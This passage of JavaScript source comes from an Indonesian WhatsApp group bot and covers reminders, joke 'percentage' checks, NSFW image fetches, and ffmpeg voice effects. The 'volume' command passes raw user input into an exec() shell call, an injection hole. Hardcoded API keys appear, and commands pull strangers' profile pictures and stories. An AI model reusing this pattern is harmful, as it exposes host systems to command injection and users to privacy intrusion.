					if (args.length < 1) return benny.sendMessage(from, 'Teksnya mana block!', MessageType.text, {quoted: adadeh})
				teks = body.slice(9)
				var buffer = await getBaper(`https://naufalhoster.xyz/textmaker/thunder?apikey=${naufalkey}&text=${teks}`)
				reply(mess.wait)
				benny.sendMessage(from, buffer, MessageType.image, { caption: `THUNDER : ${teks}`, quoted: adadeh })
					 break
					 case 'otakulast':
					 
						anu = await fetchJson(`https://api.vhtear.com/otakulatest&apikey=${vhtearkey}`)
						if (anu.error) return reply(anu.error)
						teks = '=================\n\n'
						for (let i of anu.result.data) {
							teks += `*Title* : ${i.title}\n*Link* : ${i.link}\n*Published* : ${i.datetime}\n\n=================\n\n`
						}
						reply(teks.trim())
						break
						case 'reminderopengc': // by Haikal
						teks = body.slice(16)
                const messReminds = teks.split('|')[0]
				const timeReminds = teks.split('|')[1]
                const parsedTimes = ms(toMs(timeReminds))
                reminder.addReminder(sender, messReminds, 'text', timeReminds, _reminder)
                benny.sendMessage(from, `
*── 「 REMINDER OPEN GC 」 ──*
    
Reminder berhasil diaktifkan!
➸ *Alasan*: ${messReminds}
➸ *Durasi*: ${parsedTimes.hours} jam ${parsedTimes.minutes} menit ${parsedTimes.seconds} detik
    `, text, {quoted: adadeh})
                const intervReminds = setInterval(async () => {
                    if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
                        benny.groupSettingChange(from, GroupSettingChange.messageSend, false)
                        _reminder.splice(reminder.getReminderPosition(sender, _reminder), 1)
                        fs.writeFileSync('./src/reminder.json', JSON.stringify(_reminder))
                        clearInterval(intervReminds)
                    }
                }, 1000)
				break
				case 'reminderclosegc': // by Haikal
						teks = body.slice(17)
                const messRemindss = teks.split('|')[0]
				const timeRemindss = teks.split('|')[1]
                const parsedTimess = ms(toMs(timeRemindss))
                reminder.addReminder(sender, messRemindss, 'text', timeRemindss, _reminder)
                benny.sendMessage(from, `
*── 「 REMINDER CLOSE GC 」 ──*
    
Reminder berhasil diaktifkan!
➸ *Alasan*: ${messRemindss}
➸ *Durasi*: ${parsedTimess.hours} jam ${parsedTimess.minutes} menit ${parsedTimess.seconds} detik
    `, text, {quoted: adadeh})
                const intervRemindss = setInterval(async () => {
                    if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
                        benny.groupSettingChange(from, GroupSettingChange.messageSend, true)
                        _reminder.splice(reminder.getReminderPosition(sender, _reminder), 1)
                        fs.writeFileSync('./src/reminder.json', JSON.stringify(_reminder))
                        clearInterval(intervRemindss)
                    }
                }, 1000)
				break
				case 'reminder': // by Slavyan
						
						teks = body.slice(10)
                const messRemind = teks.split('|')[0]
				const timeRemind = teks.split('|')[1]
				typeRemind = 'Text'
				if (isQuotedImage) typeRemind = 'Image'
				if (isQuotedSticker) typeRemind = 'Sticker'
				if (isQuotedAudio) typeRemind = 'Audio'
				if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker) typeRemind = 'Text'
                const parsedTime = ms(toMs(timeRemind))
                reminder.addReminder(sender, messRemind, typeRemind, timeRemind, _reminder)
				if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
                await benny.sendMessage(from, `
*── 「 REMINDER 」 ──*
    
Reminder berhasil diaktifkan!
➸ *Pesan*: ${messRemind}
➸ *Type*: Text
➸ *Durasi*: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${parsedTime.seconds} detik
➸ *Untuk*: @${sender.split('@')[0]}
    `, text, {contextInfo:{mentionedJid: [sender]}})
                const intervRemind = setInterval(async () => {
                    if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
						anu = await reminder.getReminderMsg(sender, _reminder)
                        benny.sendMessage(from, `*── 「 REMINDER 」 ──*

⏰ @${sender.split('@')[0]} ⏰
➸ *Pesan*: ${messRemind}
➸ *Type*: ${reminder.getReminderType(sender, _reminder)}`, text, {contextInfo:{mentionedJid: [sender]}})
                        _reminder.splice(reminder.getReminderPosition(sender, _reminder), 1)
                        fs.writeFileSync('./src/reminder.json', JSON.stringify(_reminder))
                        clearInterval(intervRemind)
                    }
                }, 1000)
				} else if (isQuotedSticker) {
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				media = await benny.downloadAndSaveMediaMessage(encmedia)
                await benny.sendMessage(from, `
*── 「 REMINDER 」 ──*
    
Reminder berhasil diaktifkan!
➸ *Pesan*: ${messRemind}
➸ *Type*: Sticker
➸ *Durasi*: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${parsedTime.seconds} detik
➸ *Untuk*: @${sender.split('@')[0]}
    `, text, {contextInfo:{mentionedJid: [sender]}})
                const intervRemind = setInterval(async () => {
                    if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
						anu = await reminder.getReminderMsg(sender, _reminder)
                        benny.sendMessage(from, `*── 「 REMINDER 」 ──*

⏰ @${sender.split('@')[0]} ⏰
➸ *Pesan*: ${messRemind}
➸ *Type*: ${reminder.getReminderType(sender, _reminder)}`, text, {contextInfo:{mentionedJid: [sender]}})
                        benny.sendMessage(from, fs.readFileSync(media), sticker)
                        _reminder.splice(reminder.getReminderPosition(sender, _reminder), 1)
                        fs.writeFileSync('./src/reminder.json', JSON.stringify(_reminder))
                        clearInterval(intervRemind)
                    }
                }, 1000)
				} else if (isQuotedImage) {
					encmedia = isQuotedImage ? JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo : ben
				media = await benny.downloadAndSaveMediaMessage(encmedia)
                await benny.sendMessage(from, `
*── 「 REMINDER 」 ──*
    
Reminder berhasil diaktifkan!
➸ *Pesan*: ${messRemind}
➸ *Type*: Image
➸ *Durasi*: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${parsedTime.seconds} detik
➸ *Untuk*: @${sender.split('@')[0]}
    `, text, {contextInfo:{mentionedJid: [sender]}})
                const intervRemind = setInterval(async () => {
                    if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
						anu = await reminder.getReminderMsg(sender, _reminder)
                        teks = `*── 「 REMINDER 」 ──*

⏰ @${sender.split('@')[0]} ⏰
➸ *Pesan*: ${messRemind}
➸ *Type*: ${reminder.getReminderType(sender, _reminder)}`
benny.sendMessage(from, media, image, {contextInfo:{mentionedJid: [sender]}, caption: teks})
                        _reminder.splice(reminder.getReminderPosition(sender, _reminder), 1)
                        fs.writeFileSync('./src/reminder.json', JSON.stringify(_reminder))
                        clearInterval(intervRemind)
                    }
                }, 1000)
				} else if (isQuotedAudio) {
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				media = await benny.downloadAndSaveMediaMessage(encmedia)
                await benny.sendMessage(from, `
*── 「 REMINDER 」 ──*
    
Reminder berhasil diaktifkan!
➸ *Pesan*: ${messRemind}
➸ *Type*: Audio
➸ *Durasi*: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${parsedTime.seconds} detik
➸ *Untuk*: @${sender.split('@')[0]}
    `, text, {contextInfo:{mentionedJid: [sender]}})
                const intervRemind = setInterval(async () => {
                    if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
						anu = await reminder.getReminderMsg(sender, _reminder)
                        benny.sendMessage(from, `*── 「 REMINDER 」 ──*

⏰ @${sender.split('@')[0]} ⏰
➸ *Pesan*: ${messRemind}
➸ *Type*: ${reminder.getReminderType(sender, _reminder)}`, text, {contextInfo:{mentionedJid: [sender]}})
benny.sendMessage(from, fs.readFileSync(media), audio, {contextInfo:{mentionedJid: [sender]}, mimetype: 'audio/mp4', ptt: true, caption: teks})
                        _reminder.splice(reminder.getReminderPosition(sender, _reminder), 1)
                        fs.writeFileSync('./src/reminder.json', JSON.stringify(_reminder))
                        clearInterval(intervRemind)
                    }
                }, 1000)
				}
            break
				case 'nsfwneko':
				
					gatauda = body.slice(6)
					reply(mess.wait)
					 anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwneko?apikey=BotWeA`)
					buffer = await getBaper(anu.result)
					benny.sendMessage(from, buffer, image, { caption: `NSFW NEKO!`, quoted: adadeh })
					break
				case 'groupid':
				reply(from)
				break
				case 'nsfwtrap':
				
					gatauda = body.slice(6)
					reply(mess.wait)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwtrap?apikey=BotWeA`)
					buffer = await getBaper(anu.result)
					benny.sendMessage(from, buffer, image, { caption: `NSFW TRAP!`, quoted: adadeh })
					break
				case 'nsfwblowjob':
				
					gatauda = body.slice(6)
					reply(mess.wait)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwblowjob?apikey=BotWeA`)
					buffer = await getBaper(anu.result)
					benny.sendMessage(from, buffer, image, { caption: `BLOWJOB!`, quoted: adadeh })
					break
					case 'rate':
					 // Fix Bug By ItsmeikyXSec404				
                 
					rate = body.slice(1)
					const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
					benny.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, {quoted: adadeh})
					break
                case 'sangecek':
					 // Fix Bug By ItsmeikyXSec404				
                 
					sange = body.slice(1)
					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const nge = sang[Math.floor(Math.random() * sang.length)]
					benny.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, {quoted: adadeh})
					break
                case 'gaycek':
					 // Fix Bug By ItsmeikyXSec404				
                 
					gayy = body.slice(1)
					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const yag = gay[Math.floor(Math.random() * gay.length)]
					benny.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, {quoted: adadeh})
					break
                case 'lesbicek':
					 // Fix Bug By ItsmeikyXSec404				
                 
					lesbii = body.slice(1)
					const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const bi = lesbi[Math.floor(Math.random() * lesbi.length)]
					benny.sendMessage(from, 'Pertanyaan : *'+lesbii+'*\n\nJawaban : '+ bi+'%', text, {quoted: adadeh})
					break
                case 'gantengcek':
					 // Fix Bug By ItsmeikyXSec404				
                 
					ganteng = body.slice(1)
					const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					benny.sendMessage(from, 'Pertanyaan : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, {quoted: adadeh})
					break
		case 'cantikcek':
					 // Fix Bug By ItsmeikyXSec404				
                 
					cantik = body.slice(1)
					const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tiks = can[Math.floor(Math.random() * can.length)]
					benny.sendMessage(from, 'Pertanyaan : *'+cantik+'*\n\nJawaban : '+ tiks+'%', text, {quoted: adadeh})
					break
		case 'watak':
					 // Fix Bug By ItsmeikyXSec404				
                 
					watak = body.slice(1)
					const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const tak = wa[Math.floor(Math.random() * wa.length)]
					benny.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, {quoted: adadeh})
				        break
		case 'hobby':
					 // Fix Bug By ItsmeikyXSec404				
                 
					hobby = body.slice(1)
					const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					benny.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, {quoted: adadeh})
					break
case 'hug':                      

               buffer = `http://api.lolhuman.xyz/api/random/hug?apikey=${lolkey}`
			   sendStickerUrl(from, buffer)
                                             break
										case 'poke2':                      

               buffer = `http://api.lolhuman.xyz/api/random/poke?apikey=${lolkey}`
			   sendStickerUrl(from, buffer)
                                             break
											 case 'ttg':                      

               buffer = `https://api.vhtear.com/textxgif?text=${body.slice(5)}&apikey=YunitaGanteng`
			   sendStickerUrl(from, buffer)
                                             break
										case 'sleding':                      

if (args.length > 1) {
tokp = body.slice(9)
               buffer = `https://api.vhtear.com/slidingtext?text=${tokp}&apikey=YunitaGanteng`
			   sendStickerUrl(from, buffer)
} else 
if (args.length < 1) {
tokp = ben.message.extendedTextMessage.contextInfo.quotedMessage.conversation
               buffer = `https://api.vhtear.com/slidingtext?text=${tokp}&apikey=YunitaGanteng`
			   sendStickerUrl(from, buffer)
}
                                             break
										case 'pat':                      

               buffer = `http://api.lolhuman.xyz/api/random/pat?apikey=${lolkey}`
			   sendStickerUrl(from, buffer)
                                             break
										case 'baka2':                      

               buffer = `http://api.lolhuman.xyz/api/random2/baka?apikey=${lolkey}`
			   sendStickerUrl(from, buffer)
                                             break
										
				 case 'attp':
				 if (args.length > 1) {
					teks = body.slice(6)
					anus = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(teks)}`)
					reply(mess.wait)
							benny.sendMessage(from, anus, sticker, {quoted: adadeh})
				 } else if (args.length < 1) {
					teks = ben.message.extendedTextMessage.contextInfo.quotedMessage.conversation
					anu = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(teks)}`)
					reply(mess.wait)
							benny.sendMessage(from, anu, sticker, {quoted: adadeh})
				 }
										break
										case 'attp2':
				 
					teks = body.slice(6)
					anu = await getBaper(`http://api.lolhuman.xyz/api/attp?apikey=${lolkey}&text=${body.slice(7)}`)
					reply(mess.wait)
							benny.sendMessage(from, anu, sticker, {quoted: adadeh})
										break
						case 'pick':
						
						orngo = body.slice(6)
			jom = orngo.split('|')[0]
			jom1 = orngo.split('|')[1]
			jom2 = groupMembers
			mem_id = []
			teks = `*${jom1}*\n\n`
			for (let i = 0; i < jom; i++) {
			kepoah = jom2[Math.floor(Math.random() * jom2.length)]
			teks += `@${kepoah.jid.split('@')[0]}\n`
			mem_id.push(kepoah.jid)
			}
			benny.sendMessage(from, teks.trim(), text, {contextInfo: {mentionedJid: mem_id}, quoted: adadeh})
			break
case 'apakah':

					apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					reply('Pertanyaan : '+apakah+'\n\nJawaban : '+ kah)
					break
case 'kapan':

					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					reply('Pertanyaan : '+kapankah+'\n\nJawaban : '+ koh)
					break
case 'bisakah':

					bisakah = body.slice(1)
					const bisa =['Bisa','Tidak Bisa','Coba Ulangi']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					reply('Pertanyaan : '+bisakah+'\n\nJawaban : '+ keh)
					break
		case 'stickpp':
		
		anu = `${body.slice(7)}@s.whatsapp.net`
		anu1 = ben.message.extendedTextMessage.contextInfo.participant
		mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
		if (mentioned.length > 1) {
		try {
					ppimg = await benny.getProfilePicture(mentioned)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				buffer = await getBaper(ppimg)
				anu2 = await benny.sendMessage(from, buffer, image, {quoted: adadeh})
				benny.sendMessage(from, '#sticker', text, {quoted: anu2})
		}
		break
		case 'getpp':
		
		anu = `${body.slice(7)}@s.whatsapp.net`
		anu1 = ben.message.extendedTextMessage.contextInfo.participant
	    if (!isGroup && args.length > 1) {
		try {
					ppimg = await benny.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				buffer = await getBaper(ppimg)
				sendPesan(anu, `Kak izin ambil pp nya yah ^_^\nDisuruh @${sender.split('@')[0]}\nKaboorr aowawawoakwo`)
				benny.sendMessage(from, buffer, image, {contextInfo: {mentionedJid: [anu]}, quoted: adadeh, caption: `Ini kak pp nya @${anu.split('@')[0]}\nAku juga udah izin sama dia ^_^`})
		} else if (isGroup && budy.length < 7) {
		try {
					ppimg = await benny.getProfilePicture(anu1)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				buffer = await getBaper(ppimg)
				sendPesan(anu1, `Kak izin ambil pp nya yah ^_^\nDisuruh @${sender.split('@')[0]}\nKaboorr aowawawoakwo`)
				benny.sendMessage(from, buffer, image, {contextInfo: {mentionedJid: [anu1]}, quoted: adadeh, caption: `Ini kak pp nya @${anu1.split('@')[0]}\nAku juga udah izin sama dia ^_^`})
		} else if (isGroup && budy.length > 7) {
			if (ben.message.extendedTextMessage == null || ben.message.extendedTextMessage == null) return reply('Tag orang nya!')
		try {
			mentioned = ben.message.extendedTextMessage.contextInfo.mentionedJid
					ppimg = await benny.getProfilePicture(mentioned[0])
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				buffer = await getBaper(ppimg)
				sendPesan(mentioned[0], `Kak izin ambil pp nya yah ^_^\nDisuruh @${sender.split('@')[0]}\nKaboorr aowawawoakwo`)
				benny.sendMessage(from, buffer, image, {contextInfo: {mentionedJid: mentioned}, quoted: adadeh, caption: `Ini kak pp nya @${mentioned[0].split('@')[0]}\nAku juga udah izin sama dia ^_^`})
			}
		
			  break
			  case 'getstory':
			  
			  if (args.length < 1) return reply('*Masukan nomor yang mau dicolong ppnya!*')
			ngontol = await benny.getStories(`${args[0]}@s.whatsapp.net`)
			console.log(ngontol)
			teks = `*STORY CHAT*\n\n`
			for (let i of ngontol) {
				for (let o of i.messages) {
					
				teks += `*Tidak dibaca:* ${i.unread}\n*Jumlah:* ${i.count}\n*Pesan:* ${i.messages[0]}\n==========================\n`
				}
			}
			reply(teks.trim())
			break
			  case 'getppgc':
			  
			  if (args.length < 1) return reply('*Masukan id group yang mau dicolong ppnya!*')
		anu = `${body.slice(9)}`
		if (args[0].includes('@g.us')) {
		try {
					ppimg = await benny.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				metadete = await benny.groupMetadata(anu)
				ano = await benny.getProfilePicture(anu)
				buffer = await getBaper(ano)
				benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: `*Ini pp group ${metadete.subject}`})
		} else {
			reply(`*Block! Nih contoh:*\n${prefix}getppgc 6289636006352-1606097314@g.us`)
		}
			  break
			  case 'getdesc':
			  
			  if (args.length < 1) return reply('*Masukan id group yang mau dicolong ppnya!*')
		anu = `${body.slice(9)}`
		if (args[0].includes('@g.us')) {
		try {
					ppimg = await benny.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				metadete = await benny.groupMetadata(anu)
				benny.sendMessage(from, metadete.desc, text, {quoted: adadeh})
		} else {
			reply(`*Block! Nih contoh:\n${prefix}getdesc 6289636006352-1606097314@g.us*`)
		}
			  break
			  case 'slowmo':
				if (!isQuotedAudio) return reply('Tag audio/vn nya!')
				encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				media = await benny.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
				fs.unlinkSync(media)
				if (err) return reply('Error!')
				uhh = fs.readFileSync(ran)
				benny.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: adadeh})
				fs.unlinkSync(ran)
				})
				break

				case 'tupai':
				if (!isQuotedAudio) return reply('Tag audio/vn nya!')
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						benny.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: adadeh})
						fs.unlinkSync(ran)
					})
				break
				case 'tupai2':
				
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						benny.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: adadeh})
						fs.unlinkSync(ran)
					})
				break
				case 'gemuk':
				case 'gemok':
				if (!isQuotedAudio) return reply('Tag audio/vn nya!')
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						benny.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: adadeh})
						fs.unlinkSync(ran)
					})
				break
				case 'tovn':
				if (!isQuotedAudio) return reply('Tag audio nya!')
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
						hah = fs.readFileSync(ran)
						benny.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: adadeh})
						fs.unlinkSync(media)
				break
				case 'hode':
				if (!isQuotedAudio) return reply('Tag audio/vn nya!')
                                        encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        media = await benny.downloadAndSaveMediaMessage(encmedia)
                                        ran = getRandom('.mp3')
                                        exec(`ffmpeg -i ${media} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
                                                fs.unlinkSync(media)
                                                if (err) return reply('Error!')
                                                hah = fs.readFileSync(ran)
                                                benny.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: adadeh})
                                                fs.unlinkSync(ran)
                                        })
                                break
				case 'vibra':
				case 'vibrato':
				if (!isQuotedAudio) return reply('Tag audio/vn nya!')
				if (!Number(args[0])) return reply('Harus nomor woi!')
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					tels = args[0]
					exec(`ffmpeg -i ${media} -filter_complex "vibrato=f=${tels}" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						benny.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: adadeh})
						fs.unlinkSync(ran)
					})
				break
				case 'volume':
				if (!isQuotedAudio) return reply('Tag audio/vn nya!')
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "volume=${args[0]}" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						benny.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: adadeh})
						fs.unlinkSync(ran)
					})
				break
				case 'vntobase64':
				if (!isQuotedAudio) return reply('Tag audio/vn nya!')
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					ran = fs.readFileSync(media)
					todi = await ran.toString('base64')
					reply(todi)
					break
				case 'robot':
				if (!isQuotedAudio) return reply('Tag audio/vn nya!')
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						benny.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: adadeh})
						fs.unlinkSync(ran)
					})
				break
				case 'budeg':
				case 'budek':
				if (!isQuotedAudio) return reply('Tag audio/vn nya!')
					   encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter_complex "acrusher=level_in=8:level_out=18:bits=8:mode=log:aa=1" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						benny.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: adadeh})
						fs.unlinkSync(ran)
					})
				break
				case 'imut':
				if (!isQuotedAudio) return reply('Tag audio/vn nya!')
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af atempo=3/4,asetrate=44500*4/3 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						benny.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: adadeh})
						fs.unlinkSync(ran)
					})
				break
				case 'balikin':
				if (!isQuotedAudio) return reply('Tag audio/vn nya!')
					encmedia = JSON.parse(JSON.stringify(ben).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await benny.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						benny.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: adadeh})
						fs.unlinkSync(ran)
					})
				break
				case 'detikvn':
				if (!isQuotedAudio) return reply('Tag audio/vn nya!')
